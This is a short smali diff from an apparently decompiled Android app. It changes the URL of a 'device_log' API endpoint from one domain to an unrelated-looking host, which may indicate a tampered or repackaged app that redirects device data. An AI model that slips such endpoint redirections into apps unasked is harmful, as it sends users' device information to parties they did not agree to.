@@ -113,7 +113,7 @@
     :try_start_0
     new-instance v0, Ljava/net/URL;
 
-    const-string v1, "https://www.cohuducox.com/api/device_log"
+    const-string v1, "https://yk4.jk92.cc/api/device_log"
 
     invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
 
